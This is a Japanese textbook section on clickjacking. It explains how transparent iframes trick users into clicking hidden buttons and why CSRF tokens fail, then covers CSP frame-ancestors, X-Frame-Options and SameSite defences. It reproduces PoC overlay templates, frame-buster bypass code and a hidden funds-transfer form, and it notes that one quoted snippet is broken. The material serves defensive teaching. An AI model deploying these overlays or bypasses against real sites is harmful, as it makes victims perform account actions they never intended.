# クリックジャッキング（UI Redressing）— 透明なiframeで「見えないボタン」を押させる攻撃と、その3層防御

> **この節で分かること**
> - クリックジャッキング（Clickjacking / UI Redressing）がなぜ成立するのか、ブラウザとCSSの設計の隙という観点で説明できる。
> - 透明な `<iframe>` を `opacity`・`z-index`・`position` で重ねて「見えないボタン」を押させる仕組みを、コードを読んで理解できる。
> - なぜCSRFトークンではクリックジャッキングを防げないのかを説明できる。
> - `Content-Security-Policy: frame-ancestors` / `X-Frame-Options` / `SameSite` Cookie という3つの防御を、それぞれの得意・不得意とともに使い分けられる。
> - frame-buster（フレーム破りスクリプト）という古い防御と、その4種のバイパス（二重フレーム / onBeforeUnload / 204 No Content / sandbox）を診断・PoC作成の観点で理解できる。
> - PortSwigger Web Security Academy のクリックジャッキング5ラボを、逐語のHTMLテンプレートを使って自力で解ける。

**元資料**:
- https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html （原典取得済み。HTML版本体はegressプロキシで遮断されたが、そのHTMLの生成元であるOWASP公式リポジトリのMarkdown原本を全文取得。内容は同一）
- https://portswigger.net/web-security/clickjacking （原典は取得できず二次情報ベース。記事本体はegressプロキシで403遮断のため、本文散文はWebSearchの逐語断片、HTMLテンプレートはGitHubミラーから逐語取得）

**関連する節**: 同一オリジンポリシー（Same-Origin Policy）、CSRF（クロスサイトリクエストフォージェリ）、Content Security Policy（CSP）、DOMベースXSS、Cookieの `SameSite` 属性

---

## 1. なぜクリックジャッキングは成立するのか — 設計の隙

### まずクリックジャッキングとは何か

クリックジャッキング（Clickjacking）とは、攻撃者が用意した「おとり（decoy）」のページの**上に**、正規サイトを透明な `<iframe>`（インラインフレーム。他のページを自ページの中に埋め込む枠）として重ね、被害者が「見えているボタンを押したつもり」で、実際には透明なiframeの中にある正規サイトのボタンを押させる攻撃のこと。別名を **UIリドレス攻撃（UI redress attack / UI Redressing）** という。

たとえば攻撃者のページには「クリックして無料ギフトを受け取る」というボタンが見えているが、その真上にはあなたのSNSアカウントの「アカウント削除」ボタンが透明に重なっている。あなたがギフトのつもりでクリックすると、実際にはアカウント削除ボタンを押してしまう。これがクリックジャッキングの基本形である。

PortSwigger は次のように定義している（逐語断片、二次情報経由）。

```text
"Clickjacking is an interface-based attack in which a user is tricked into
clicking on actionable content on a hidden website by clicking on some other
content in a decoy website."
```

「インターフェースベースの攻撃（interface-based attack）」という言い回しが本質を突いている。これはサーバのバグでもプロトコルのバグでもなく、**ユーザに見えている画面（インターフェース）そのものを騙す**攻撃だからである。

### 設計意図: なぜ他サイトをiframeで埋め込めるのか

そもそもブラウザは、あるサイトのページを別サイトの `<iframe>` に埋め込むことを**設計上許している**。これは「Webは相互に埋め込み合うことで成り立つ」という前提があるからだ。地図の埋め込み、YouTube動画の埋め込み、決済ウィジェット、SNSの「いいね」ボタンなどは、すべて他サイトを自ページに埋め込む機能である。

つまり「他サイトを枠の中に読み込める」こと自体は、Webのハイパーメディアとしての性質そのものであり、バグではない。問題は、**その埋め込まれたページを透明にして、別の見た目の上に重ねられてしまう**点にある。透明化（`opacity`）と重ね合わせ（`z-index`）と位置合わせ（`position`）というCSSの機能は、どれも本来はレイアウトのための正当な機能だ。攻撃者はそれらを組み合わせて「見えているものと、クリックが届く先が食い違う」状態を作り出す。

### どこが隙なのか

クリックジャッキングが成立する条件を整理すると次の3つになる。

```text
1. 標的ページが iframe に埋め込める（フレーム化を拒否していない）
2. 被害者が標的サイトに認証済み（ログイン中）である
3. 標的の操作が「1クリック（または数クリック）」で完了する
```

このうち攻撃者が突くのは主に条件1である。条件2は被害者側の状態、条件3は標的機能の性質だが、条件1は**標的サイトの防御の有無**そのものだ。後述するように、条件1を塞ぐのが `frame-ancestors` や `X-Frame-Options` であり、条件2を実質的に無効化するのが `SameSite` Cookie である。

> ### 📌 ここは自分で開いて読んでください
> **資料**: PortSwigger Web Security Academy「What is Clickjacking?」 — https://portswigger.net/web-security/clickjacking
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: `portswigger.net` 本体が組織のegressプロキシによりCONNECT段階で403拒否され、`web.archive.org`・medium・hackmd 等のミラーも同様に遮断された）。以下の記述は、WebSearchで得たPortSwigger本文の逐語断片と、GitHubミラー `frank-leitner/portswigger-websecurity-academy` に逐語収録された動作するPoC HTMLにもとづく要約である。
> **読みどころ**:
> 1. 「What is clickjacking?」冒頭と「How is clickjacking different from CSRF?」節。能動的クリックが必要な点と、CSRFトークンで防げない理由。
> 2. 「How to construct a basic clickjacking attack」の正典HTMLテンプレート（本節2〜4で逐語収録）。
> 3. 「Frame busting scripts」「Combining clickjacking with a DOM XSS attack」「Multistep clickjacking」の各節。
> 4. 5つのラボ（lab-basic-csrf-protected / lab-prefilled-form-input / lab-frame-buster-script / lab-exploiting-to-trigger-dom-based-xss / lab-multistep）を実際に解く。各PoCは本節「手を動かす」に逐語収録済み。
> **代替手段**: なし（本体はログイン不要で読めるので、遮断されない回線から直接開くのが最善）。

---

## 2. どう動くのか — CSSの三点セットで画面を重ねる

### 使うCSSは3つだけ

クリックジャッキングはCSSでレイヤー（層）を作り、それを操作することで実現する。攻撃者は標的サイトを自分が管理するページ内のiframeに埋め込み、次の3つのプロパティを使う。

| CSSプロパティ | 役割 | クリックジャッキングでの使い方 |
| --- | --- | --- |
| `opacity`（不透明度） | 要素の透け具合。0で完全透明、1で不透明 | 標的iframeの不透明度を下げ、中身を見えなくする |
| `z-index`（重なり順） | 要素の前後関係。大きいほど手前 | iframeを一番手前にして、クリックをiframeが受け取るようにする |
| `position`（配置） | 要素の位置決め。`relative`/`absolute`など | おとりのボタン文言を、標的の本物ボタンの真上に重ねる |

ポイントは **「見た目」と「クリックの届く先」を分離する**ことにある。被害者の目にはおとりの `<div>`（"Click me" など）が見えているが、その上に透明なiframeがかぶさっているので、クリックはiframe内の標的ボタンに吸い込まれる。

### 重なりのイメージ

構造を図にすると次のようになる。

```text
      画面をこの向き（横）から見た断面図

  ↓ 被害者のクリック
  ┌───────────────────────────┐  ← z-index:2（最前面）
  │  透明な iframe（opacity: 0.0001）  │     標的サイト /my-account
  │      中に「アカウント削除」ボタン    │     ← クリックは実際はここに届く
  └───────────────────────────┘
  ┌───────────────────────────┐  ← z-index:1（背面）
  │  おとりの div「Click me!!!」（不透明）│     被害者の目に見えるのはこれ
  └───────────────────────────┘
```

被害者は背面の「Click me!!!」を見てクリックするが、クリックは最前面の透明なiframe（標的サイト）に吸い込まれる。位置合わせ（`top`/`left`）を調整して、おとり文言が標的ボタンの真上に来るようにするのが攻撃者の作業だ。

### 攻撃者はどこを突くのか

攻撃者が狙うのは「1クリックで完了し、かつ重大な結果になる操作」である。具体例としては、メールアドレスの変更、アカウントの削除、送金、権限の付与、SNS投稿のいいね・削除などが挙げられる。これらは正規サイトでは正当な機能だが、被害者が「意図せず」実行させられると被害になる。

---

## 3. なぜCSRFトークンでは防げないのか — CSRFとの決定的な違い

### CSRFとクリックジャッキングは別物

初学者が混同しやすいのが、CSRF（クロスサイトリクエストフォージェリ、Cross-Site Request Forgery）との違いである。両者は「被害者のブラウザを使って正規サイトに操作を行わせる」点で似ているが、成立の仕方が根本的に違う。

| 観点 | CSRF | クリックジャッキング |
| --- | --- | --- |
| 被害者の操作 | 不要（リクエスト全体を攻撃者が偽造する） | **必要**（被害者が実際にクリックする） |
| 何を偽造するか | HTTPリクエスト全体 | 見た目（インターフェース）のみ。リクエストは本物 |
| CSRFトークンで防げるか | 防げる（トークンを知らないと偽造できない） | **防げない** |

CSRFは、被害者の知覚も入力もなしに「リクエストそのもの」を偽造する。だからサーバが予測不能なCSRFトークンを要求すれば、攻撃者はトークンを知らないので偽造できず、防げる。

### CSRFトークンが無力になる理由

クリックジャッキングは違う。**被害者は本物の正規サイトを（透明な状態で）表示し、本物のボタンを自分の手でクリックする**。このとき正規サイトのページには、正規サーバが発行した**本物のCSRFトークン**がすでに埋め込まれている。被害者がクリックしてフォームを送信すると、その本物のトークンごと送信されるので、サーバから見れば完全に正当なリクエストに見える。

PortSwigger はこの点を次のように述べている（逐語断片、二次情報経由）。

```text
"Clickjacking attacks are not mitigated by the CSRF token as a target session
is established with content loaded from an authentic website and with all
requests happening on-domain."
```

「セッションは正規サイトから読み込まれたコンテンツで確立され、すべてのリクエストがオンドメイン（正規ドメイン上）で発生する」——だからCSRFトークンは本物のまま送られ、防御にならない。ここがクリックジャッキングを別カテゴリの攻撃として扱うべき理由である。防御は「トークン」ではなく「そもそもフレーム化させない」方向に向かうことになる（第7〜10節）。

---

## 4. 攻撃者はどこを突くのか（1）— 基本攻撃の構築

### 正典のHTMLテンプレート

ここからは、許可された検証環境（自分で立てたラボやバグバウンティ対象）に対するPoC作成の前提で、攻撃の作り方を見る。防御を理解するには、攻撃がどう組み立てられるかを知る必要があるからだ。

PortSwigger記事に載っている正典（canonical）のHTMLテンプレートは次のとおり（逐語）。

```html
<style>
  iframe {
    position:relative;
    width:$width_value;
    height: $height_value;
    opacity: $opacity;
    z-index: 2;
  }
  div {
    position:absolute;
    top:$top_value;
    left:$side_value;
    z-index: 1;
  }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

各プレースホルダの意味は次のとおり。

| 変数 | 意味 | 目安 |
| --- | --- | --- |
| `$width_value` / `$height_value` | iframeが十分レンダリングされる寸法 | 例: 700px |
| `$opacity` | iframeの不透明度 | 位置合わせ中は 0.1、提出（本番）攻撃では 0.0001 |
| `$top_value` / `$side_value` | おとり`div`の位置 | 標的ボタンの真上に来るよう微調整 |

### opacityは「まず見えるように、最後に見えなく」

実務上のコツは不透明度の使い方にある。最初から完全透明にすると位置合わせができないので、**まず `opacity: 0.1` にして**iframe内の操作対象とおとり`div`を目視で重ね、`top`/`left` を調整する。位置が決まったら**提出用に `opacity: 0.0001`** に下げてiframeをほぼ不可視にする。

PortSwigger も次のように述べている（逐語断片、二次情報経由）。

```text
"Initially, use an opacity of 0.1 so that you can align the iframe actions and
adjust the position values as necessary. For the submitted attack a value of
0.0001 will work."
```

`z-index` は iframe を 2（手前）、おとり`div`を 1（背面）にする。これでクリックは最前面のiframeが受け取り、被害者には背面の`div`だけが見える、という第2節の断面図の状態になる。

### Burp Clickbandit で自動生成する

手でCSSを書かずに済ませる方法もある。PortSwigger は診断ツール **Burp Clickbandit** の使用を推奨している。ブラウザでフレーム化可能なページ上の目的操作を実行するだけで、適切なクリックジャッキングオーバーレイを含むHTMLファイルを生成でき、HTMLやCSSを一行も書かずに数秒で対話的なPoCが作れる。

〔補足（一般知識）: Clickbandit は JavaScript ベースのPoCジェネレータで、「record」モードで正規サイト上を操作し、「finish」でオーバーレイHTMLを出力する。手書きテンプレートの位置合わせが面倒なときの近道になる。〕

---

## 5. 攻撃者はどこを突くのか（2）— フォーム事前入力・frame-busterバイパス・DOM XSS連鎖・多段

基本形が分かったところで、実際のラボで問われる4つの応用を押さえる。どれも「1クリックさせる」という骨格は同じで、標的の防御や機能に応じた工夫が加わる。

### 5-1. GETパラメータでフォームを事前入力する

一部のサイトは、URLのGETパラメータでフォーム入力を送信前に**事前入力（prepopulate）**できる。たとえば `?email=...` を付けてページを開くと、メール欄がその値で埋まった状態になる。攻撃者はこれを使い、標的URLに任意の値を仕込んだうえで、透明な「submit」ボタンをおとりに重ねる。

PortSwigger の記述（逐語断片、二次情報経由）。

```text
"Some websites permit prepopulation of form inputs using GET parameters prior
to submission... the target URL can be modified to incorporate values of the
attacker's choosing with the transparent 'submit' button overlaid on the decoy
site."
```

〔補足（frank-leitner write-up の教訓）: iframe の中身が**別ドメイン**の場合、その中身にJavaScriptから触れることは同一オリジンポリシー（Same-Origin Policy, SOP。異なるオリジンの文書どうしが互いの中身を読み書きできないようにするブラウザの基本規則）で禁止されている。つまり `document.getElementsByName(...)` のようなJSでフォームを埋めようとするのは行き止まりである。正しい道は「サイトがURLパラメータでフォームを事前入力できる」機能を利用し、iframe の `src` に `?email=mail@evil.me` を付けて、ロード時にフィールドを埋めさせることだ。〕

### 5-2. frame-busterスクリプトをsandboxでバイパスする

クライアント側の防御として、frame busting / frame breaking スクリプト（自ウィンドウが最上位でなければページ内容を差し替える等のJavaScript。詳しくは第10節）がよく使われる。しかし攻撃者は **HTML5 iframe の `sandbox` 属性**でこれを回避できる。

`sandbox` に `allow-forms` と `allow-scripts` を指定するとそれぞれフォーム/スクリプトを許可するが、**トップレベルナビゲーションは無効化**される。frame破りは「`top.location = self.location` でページ全体を差し替える」動きなので、トップレベルナビゲーションが無効化されると封じられる。一方でフォーム送信（標的の機能）は許可される。

PortSwigger の記述（逐語断片、二次情報経由）。

```text
"An effective attacker workaround against frame busters is to use the HTML5
iframe sandbox attribute. Both the allow-forms and allow-scripts values permit
the specified actions within the iframe but top-level navigation is disabled,
which inhibits frame busting behaviours while allowing functionality within the
targeted site."
```

さらに要点として、frame-busterスクリプトが走るのは iframe に script 権限（`allow-scripts`）を与えたときだけである。よって **`allow-scripts` を付けず `allow-forms` だけ**にすれば、frame破りコードそのものが動かない。ただし標的ページの他のスクリプトもすべて止まるため、frame破りは無効化できても標的の機能が壊れる可能性があるトレードオフに注意する。

### 5-3. クリックジャッキングとDOMベースXSSを連鎖させる

クリックジャッキング単体は「被害者の1クリックで起こせる操作」に限られる。しかし **DOMベースXSS（Document Object Model を経由して発火するクロスサイトスクリプティング）のsink**と連鎖させると、その1クリックがアカウント操作ではなく、被害者の認証済みセッション内での**任意JavaScript実行**を引き起こす。

しかもXSSペイロードの別配送手段（メールやリンク）は不要で、クリックジャッキングのiframe自体が配送手段になる。骨子は次のとおり。

```text
1. URLパラメータで事前入力できるフォーム等にXSSペイロードを注入する
2. そのペイロード入りURLを iframe の src にする
3. 被害者がおとりをクリック → iframe内の送信ボタンが押される
4. DOM XSS が発火する
```

PortSwigger の記述（逐語断片、二次情報経由）。

```text
"The XSS exploit is then combined with the iframe target URL so that the user
clicks on the button or link and consequently executes the DOM XSS attack."
```

### 5-4. 多段（Multistep）クリックジャッキング

操作が複数ステップにわたる場合（例: 「削除」→確認ダイアログで「confirm」）、攻撃者はおとり`div`を**複数**用意し、それぞれを各ステップのボタンの上に重ねる。おとりに「Click me first」「Click me next」のような順序指示を書いておけば、被害者はその指示に従って複数の透明ボタンを順にクリックしてしまう。

これにより、window.confirm 的な「本当に削除しますか？」という追加確認ダイアログすら突破されうる。確認ボタンの上にも透明なおとりを重ねておけば、確認そのものがクリック誘導の1ステップになるからだ。

---

## 6. 防御の全体像 — 3つの独立したメカニズム

ここから守る側に回る。OWASP の Clickjacking Defense Cheat Sheet は、クリックジャッキング防御に主に3つの独立したメカニズムがあるとしている。

| 防御 | 何をするか | 主な手段 |
| --- | --- | --- |
| フレーム化拒否 | ページがフレームに読み込まれること自体をブラウザに拒否させる | `X-Frame-Options` / CSP `frame-ancestors` |
| Cookieを載せない | フレーム内で読み込まれたときにセッションCookieを含めない | `SameSite` Cookie属性 |
| frame-buster | フレーム内での読み込みを阻止するJavaScriptをページに実装する | frame-breaking スクリプト（レガシー向け） |

これらは互いに独立しており、可能なら**多層防御（defense in depth）**のため複数を実装すべきである。多層防御とは、1つの防御が破られても別の防御が残るよう、複数の対策を重ねる考え方のこと。以降でそれぞれを見ていく。

---

## 7. 防御（1）— CSP frame-ancestors（推奨）

### 設計意図と仕組み

`frame-ancestors` ディレクティブは、`Content-Security-Policy`（CSP）というHTTPレスポンスヘッダの中で使い、ブラウザに対して「このページを `<frame>` / `<iframe>` にレンダリングしてよいか」を指示する。自サイトのコンテンツが他サイトに埋め込まれないよう保証することでクリックジャッキングを防ぐ。通常のCSPセマンティクスで複数ドメインを許可できる。

### 代表的な3つの設定（逐語）

```text
Content-Security-Policy: frame-ancestors 'none';
```
→ いかなるドメインからのフレーム化も禁止する。フレーム化の具体的な必要性が特定されない限り、**この設定が推奨**される。

```text
Content-Security-Policy: frame-ancestors 'self';
```
→ 現在のサイトのみがコンテンツをフレーム化できる。

```text
Content-Security-Policy: frame-ancestors 'self' *.somesite.com https://myfriend.site.com;
```
→ 現在のサイト、`somesite.com` の任意ページ（任意プロトコル）、および `myfriend.site.com`（HTTPSのデフォルトポート443のみ）を許可する。

### 文法の落とし穴

`self` と `none` の周囲の**シングルクォートは必須**だが、その他のソース式（`*.somesite.com` など）にはクォートを付けない。この規則を間違えるとポリシーが効かないので注意する。

### X-Frame-Options との優先関係

CSP仕様の "Relation to X-Frame-Options" 節によれば、「リソースが `frame-ancestors` ディレクティブを含み、disposition が "enforce" のポリシーで配信された場合、`X-Frame-Options` ヘッダは無視されなければならない（MUST be ignored）」とされる。つまり両方付いていれば新しい `frame-ancestors` が勝つ。ただし古いブラウザ（例: Chrome 40, Firefox 35）はこの要件を無視し、代わりに `X-Frame-Options` に従った。だから後方互換のため両方付けるのが実務では無難である。

> ### 📌 ここは自分で開いて読んでください
> **資料**: OWASP Clickjacking Defense Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: HTML版本体が組織のegressプロキシで403遮断された）。ただし、このHTMLの生成元であるOWASP公式リポジトリのMarkdown原本（`raw.githubusercontent.com/OWASP/CheatSheetSeries/master/cheatsheets/Clickjacking_Defense_Cheat_Sheet.md`）を全文取得しており、本節7〜10の記述はその原本にもとづく。内容はHTML版と同一である。
> **読みどころ**:
> 1. CSP `frame-ancestors` の3例と「`self`/`none` は必ずシングルクォート、他は不要」という文法規則。
> 2. 「Common Defense Mistakes」節（`X-Frame-Options` も `frame-ancestors` も metaタグでは効かない）。
> 3. `X-Frame-Options` の各種制限（ALLOW-FROM廃止・複数値不可・ネストフレーム・プロキシ剥がし・非推奨化）。
> 4. 図 `Clickjacking_Defense_Cheat_Sheet_NestedFrames.png`（ネストフレームで SAMEORIGIN / ALLOW-FROM が壊れる説明図）。
> **代替手段**: 同内容のMarkdownソースが `https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/cheatsheets/Clickjacking_Defense_Cheat_Sheet.md` にある（HTML版が開けない環境ではこれを読む）。

---

## 8. 防御（2）— X-Frame-Options（後方互換）

### 仕組みと3つの値

`X-Frame-Options` はHTTPレスポンスヘッダで、ページを `<frame>` / `<iframe>` にレンダリングしてよいかを指示する。HTMLコンテンツを含む**すべてのレスポンス**に設定する。取りうる値は次の3つ。

| 値 | 意味 |
| --- | --- |
| `DENY` | いかなるドメインからのフレーム化も禁止。必要が特定されない限りこれが推奨 |
| `SAMEORIGIN` | 現在のサイト（同一オリジン）のみフレーム化を許可 |
| `ALLOW-FROM uri` | 指定した uri にフレーム化を許可（例: `ALLOW-FROM http://www.example.com`）。**廃止済み** |

`ALLOW-FROM` は廃止された（obsolete）ディレクティブで、現代のブラウザではもはや動作しない。ブラウザが未対応の場合は **fail open（防御なしでそのまま通ってしまう）** になるため、`ALLOW-FROM` に依存するとクリックジャッキング防御が**まったく無くなる**ことがある。

### 実装方法

保護したい各ページに `X-Frame-Options` ヘッダを追加する。手動で全ページに付けるほか、フィルタで全ページに自動付与する、あるいはWAF（Web Application Firewall）やWeb・アプリケーションサーバのレベルで付与する方法が簡潔である。

### よくある防御ミス: metaタグは効かない

初学者が最もやりがちなミスがこれである。`X-Frame-Options` を適用しようとする **`<meta>` タグは動作しない**。たとえば次は**動作しない**。

```html
<meta http-equiv="X-Frame-Options" content="deny">
```

必ずHTTPレスポンスヘッダとして適用すること。同じ規則がCSPの `frame-ancestors` にも当てはまり、`<meta>` タグではなくHTTPレスポンスヘッダとして設定しなければならない。

〔補足: 後述のPayloadsAllTheThings は `<meta http-equiv="Content-Security-Policy" content="frame-ancestors 'self';">` というmeta例を挙げているが、OWASP のこの規則に照らすと**実運用ではmetaではなくレスポンスヘッダで設定すべき**である。〕

### X-Frame-Options の制限

`X-Frame-Options` には次のような制限があり、これらが `frame-ancestors` へ移行すべき理由になっている。

| 制限 | 内容 |
| --- | --- |
| ページ単位のポリシー | 全ページに指定する必要があり展開が煩雑。サイト全体に強制できると楽 |
| マルチドメイン | 許可ドメインのリストを列挙できない（危険だが必要な場合もある） |
| ALLOW-FROM 非対応 | 廃止済み。依存するとブラウザ未対応時に防御が完全に消える |
| 複数指定不可 | 自サイトと第三者サイトの両方に同一レスポンスのフレーム化を許可できない。値は1つだけ |
| ネストフレーム | SAMEORIGIN / ALLOW-FROM はネストされたフレームで正しく動かないことがある |
| 非推奨（Deprecated） | CSP Level 2 の `frame-ancestors` に取って代わられ廃止扱い |
| プロキシ | Webプロキシがヘッダを剥がすとフレーム化保護を失う |

ネストフレームの問題を補足すると、`ALLOW-FROM` はトップレベルのブラウジングコンテキストに適用され、直接の親には適用されないため、`http://framed.invalid/child` フレームが読み込まれない状況が起こる。解決策は親・子両方で `ALLOW-FROM` を使うことだが、それも `//framed.invalid/parent` がトップレベル文書として読み込まれると子フレームの読み込みを妨げる。要するに `frame-ancestors` を使うのが正解である。

---

## 9. 防御（3）— SameSite Cookie

### 仕組み

`SameSite` Cookie属性（RFC 6265bis 5.3.7）は主にCSRF防御が目的だが、クリックジャッキングに対する保護も提供できる。`SameSite` 属性が `Strict` か `Lax` のCookieは、`<iframe>` 内のページへのリクエストに含まれない。

つまりセッションCookieに `SameSite=Strict` または `SameSite=Lax` が付いていれば、iframe内で標的サイトを開いてもセッションCookieが送られない。第1節で見た成立条件のうち「被害者が認証済みであること」が実質的に崩れるので、**被害者が認証済みであることを要件とするクリックジャッキング攻撃は成立しない**。

### 制限

ただし `SameSite` は万能ではない。

- クリックジャッキング攻撃が**ユーザ認証を必要としない**場合、この属性は何の保護も与えない。
- `SameSite` はほとんどの現代ブラウザで対応されるが、未対応ブラウザのユーザも一部（2020年11月時点で約6%）残る。
- この属性は**多層防御（defense-in-depth）の一部**とみなすべきで、クリックジャッキングに対する唯一の保護手段として依存してはならない。

つまり `SameSite` は「認証を伴うクリックジャッキングをかなり潰せるが、フレーム化拒否ヘッダ（第7・8節）の代わりにはならない」補助的防御と位置づけるのが正しい。

---

## 10. レガシー防御 — frame-buster とそのバイパス

### frame-buster とは

frame-buster（フレーム破り、frame-breaking）スクリプトとは、ページが自分自身をフレーム内で表示させないためのJavaScriptのこと。X-Frame-Options に未対応の古いブラウザ向けの防御である。ただし後述のように**バイパス手法が多数公開されており**、単独の防御としては信頼できない。診断では「これに頼っているサイトは実は脆弱」という視点が重要になる。

### OWASP推奨の「今できる最善」frame-breaker

OWASP は、レガシーブラウザ向けの比較的堅いパターンとして次を挙げている。まず HEAD 内で body を最初から非表示にする style を置く（逐語）。

```html
<style id="antiClickjack">
    body{display:none !important;}
</style>
```

その直後に、フレーム化されていない（`self === top`）ときだけ style をIDで削除して表示を復活させるスクリプトを置く（逐語）。

```html
<script type="text/javascript">
    if (self === top) {
        var antiClickjack = document.getElementById("antiClickjack");
        antiClickjack.parentNode.removeChild(antiClickjack);
    } else {
        top.location = self.location;
    }
</script>
```

〔補足（一般知識）: この「デフォルトで body を `display:none` にし、フレーム化されていないときだけ表示を復活させる」パターンは、JSが無効だと単に非表示のままになる。少なくとも「透明フレームでのクリック誘導」は成立しにくくなり、素朴な `if(top!=self) top.location=self.location` 型より堅い。〕

### window.confirm() による緩和

X-Frame-Options や frame-breaking のほうがフェイルセーフだが、コンテンツが**どうしてもフレーム化可能でなければならない**シナリオでは、`window.confirm()` で実行しようとしている操作をユーザに知らせて緩和できる。`window.confirm()` を呼ぶと**フレーム化できない**ポップアップが表示され、iframeが親と異なるドメインなら発生元ドメインが表示される（逐語）。

```html
<script type="text/javascript">
    var action_confirm = window.confirm("Are you sure you want to delete your youtube account?")
    if (action_confirm) {
        //... Perform action
    } else {
        //... The user does not want to perform the requested action.`
    }
</script>
```

### 「使ってはいけない（DO NOT USE）」スクリプト

OWASP は、次のような単純な frame breaking を**使ってはいけない**例として挙げている（逐語）。

```html
<script>if (top!=self) top.location.href=self.location.href</script>
```

このスクリプトは親ウィンドウに現フレームのURLを読み込ませてフレーム化を防ごうとするが、これを破る手法が複数公開されている。以下の4種が代表例である。

### バイパス（1）二重フレーム化（Double Framing）

一部のframe破りは `parent.location` へ値を代入してページ遷移する。しかし攻撃者が被害者を**フレームの中のさらにフレーム**（二重フレーム）に包むと、`parent.location` へのアクセスが全主要ブラウザで **descendant frame navigation policy（子孫フレームのナビゲーションポリシー）** によりセキュリティ違反となり、この対抗ナビゲーションが無効化される。

被害側のframe破りコード（逐語）。

```javascript
if(top.location != self.location) {
    parent.location = self.location;
}
```

攻撃者のトップフレーム（逐語）。

```html
<iframe src="attacker2.html">
```

攻撃者のサブフレーム（逐語）。

```html
<iframe src="http://www.victim.com">
```

### バイパス（2）onBeforeUnload イベント

フレーム化する側のページが `onBeforeUnload` ハンドラを登録する。被害ページのframe破りがナビゲーションを起こそうとするたびに呼ばれ、ハンドラの戻り値の文字列がユーザへのプロンプトの一部になる。攻撃者は「Do you want to exit PayPal?」のような文字列を返し、ユーザにナビゲーションのキャンセルを促してframe破りを無効化する（逐語）。

```html
<script>
    window.onbeforeunload = function(){
        return "Asking the user nicely";
    }
</script>

<iframe src="http://www.paypal.com">
```

### バイパス（3）No-Content Flushing（204）

これはユーザ操作なしで自動化できる。現代ブラウザでは "204 - No Content" を返すサイトへナビゲーション要求を繰り返し送ることで、`onBeforeUnload` ハンドラ内で来たナビゲーション要求を自動キャンセルできる。No Contentサイトへの遷移は事実上何も起きない（NOP）が、リクエストパイプラインをフラッシュして元のframe破りナビゲーションをキャンセルする。OWASP掲載のサンプルコード（逐語）。

```javascript
var preventbust = 0
window.onbeforeunload = function() { killbust++ }
setInterval( function() {
    if(killbust > 0){
    killbust = 2;
    window.top.location = 'http://nocontent204.com'
    }
}, 1);
```

```html
<iframe src="http://www.victim.com">
```

〔補足（一般知識）: 原文のこの断片は変数名が `preventbust` と `killbust` で食い違っており、そのままでは動くコードではない（OWASP原文ママ）。意図は「onbeforeunload でカウンタを立て、1msごとに204ページへ飛ばして frame破りナビゲーションをフラッシュ・無効化する」こと。整合の取れた版は次の第11節（PayloadsAllTheThings）に載せた。〕

### バイパス（4）Restricted zones（サブフレームのJSを殺す）

ほとんどのframe破りは、フレーム化されたページ内のJavaScriptが動くことに依存する。だからサブフレームのJavaScriptを無効化すれば、frame破りコードは走らない。Chrome では `sandbox` 属性で実現する（逐語）。

```html
<iframe src="http://www.victim.com" sandbox></iframe>
```

Firefox では親ページで `designMode` を有効化する（逐語）。designMode は現代ブラウザでも対応されるが、攻撃ベクトルとしての有効性は現行バージョンでは異なりうる。

```javascript
document.designMode = "on";
```

> ### 📌 ここは自分で開いて読んでください
> **資料**: Busting Frame Busting: a Study of Clickjacking Vulnerabilities on Popular Sites（Stanford Web Security）— https://seclab.stanford.edu/websec/framebusting/framebust.pdf
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: 本節のバイパス4種はOWASP経由の逐語断片で扱ったが、その理論的原典であるこのPDF論文自体はegress制限で取得しなかった）。以下の理解は、OWASP Cheat Sheet が引用する二次情報にもとづく。
> **読みどころ**:
> 1. frame-buster の分類（top.location 型 / parent.location 型など）と、なぜ壊れるかの体系。
> 2. Double Framing・onBeforeUnload・204 No Content・XSSフィルタ悪用の理論的裏付け。
> 3. 人気サイトの実測調査結果（当時どのサイトのframe-bustingが破れたか）。
> **代替手段**: OWASP Clickjacking Defense Cheat Sheet の "DO NOT USE" 節（本節10）が、この論文の主要バイパスを逐語コードつきで要約している。

---

## 11. 補完 — PayloadsAllTheThings の逐語PoC集

OWASP（防御中心）とPortSwigger（ラボ中心）を補完する実務資料として、`swisskyrepo/PayloadsAllTheThings` の Clickjacking ページがある。ここには UI Redressing の一般形と、frame-busterバイパスの整合の取れた逐語PoCが載っている。

### UI Redressing の一般形

透明なUI要素（通常 `<div>`, `opacity: 0;`）を正規サイトの上に重ね、`position: absolute; top: 0; left: 0;` で全ビューポートを覆う（逐語）。

```html
<div style="opacity: 0; position: absolute; top: 0; left: 0; height: 100%; width: 100%;">
  <a href="malicious-link">Click me</a>
</div>
```

不可視フレーム（Invisible Frames）は iframe を `opacity: 0; height: 0; width: 0; border: none;` で不可視化する（逐語）。

```html
<iframe src="malicious-site" style="opacity: 0; height: 0; width: 0; border: none;"></iframe>
```

Button/Form Hijacking は、可視ボタンの上に不可視オーバーレイを重ね、クリックで隠しフォームを送信させる（逐語）。

```html
<button onclick="submitForm()">Click me</button>
<form action="legitimate-site" method="POST" id="hidden-form">
  <!-- Hidden form fields -->
</form>
<script>
  function submitForm() {
    document.getElementById('hidden-form').submit();
  }
</script>
```

隠しフォーム（Execution Methods）の例（逐語）。

```html
<form action="malicious-site" method="POST" id="hidden-form" style="display: none;">
<input type="hidden" name="username" value="attacker">
<input type="hidden" name="action" value="transfer-funds">
</form>
```

### 防御策（逐語）

Apache で X-Frame-Options を付ける例（逐語）。

```apache
Header always append X-Frame-Options SAMEORIGIN
```

CSP のmetaタグ例（逐語。ただし第8節のとおり実運用はレスポンスヘッダにすべき）。

```html
<meta http-equiv="Content-Security-Policy" content="frame-ancestors 'self';">
```

frame破りが依存するJSを殺す例。IE の `security="restricted"` 属性（IE6以降。JS・ActiveX・他サイトへのリダイレクトを無効化）（逐語）。

```html
<iframe src="http://target site" security="restricted"></iframe>
```

HTML5 `sandbox` 属性（逐語）。

```html
<iframe src="http://target site" sandbox></iframe>
```

### onBeforeUnload の整合PoC（ユーザ操作あり／なし）

ユーザ操作を要する版（逐語）。

```html
<h1>www.fictitious.site</h1>
<script>
    window.onbeforeunload = function()
    {
        return " Do you want to leave fictitious.site?";
    }
</script>
<iframe src="http://target site">
```

